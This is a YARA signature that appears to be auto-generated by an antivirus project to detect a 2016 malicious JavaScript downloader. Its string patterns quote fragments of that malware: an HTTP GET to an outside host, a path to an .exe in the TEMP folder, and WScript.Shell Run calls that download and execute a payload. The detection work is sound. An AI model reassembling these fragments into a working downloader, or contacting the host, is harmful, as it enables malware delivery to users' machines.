rule sig_20160329_e957be8f8d0b23506376f690cacf0780 {
  meta:
    description = "datamaliciousorder - file 20160329_e957be8f8d0b23506376f690cacf0780.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9104ef51ebaf4cebbddad70a0387afca5a91d96c9f12cb248c164e9ec05e2347"

  strings:
    $s1  = "js[Y](\"GET\", \"http://hiddenhandbags.com/kdk4a\", false);" fullword ascii
    $s2  = "function n() {return QN[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"fnkzVL5mVFc9YJ8y.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Be](D() * 11); if (js[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function l(f, H){um = um * 1; return f - H;};" fullword ascii
    $s5  = "var QN = function ex() {return WScript[p](\"WScript.Shell\");}(), S = 11;" fullword ascii
    $s6  = "function Ye(){return \"\" + KM;};" fullword ascii
    $s7  = "function c(C){QN[\"Run\"](C, um, um);};" fullword ascii
    $s8  = "function u() {return ((SU == true) && (SU == EF)) ? 1 : um;};" fullword ascii
    $s9  = "function z()" fullword ascii
    $s10 = "function D(){return 22;};" fullword ascii
    $s11 = " while (zz){" fullword ascii
    $s12 = "return l(R, E);" fullword ascii
    $s13 = "function J(){return p;};" fullword ascii
    $s14 = "function y(D0) {var s = (1, 2, 3, 4, 5, D0); return s;};" fullword ascii
    $s15 = "var aI = new this[\"Date\"]();" fullword ascii
    $s16 = "EF = true; " fullword ascii
    $s17 = "var tp = false;" fullword ascii
    $s18 = "SU = true; " fullword ascii
    $s19 = "var SU = false;" fullword ascii
    $s20 = "var EF = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}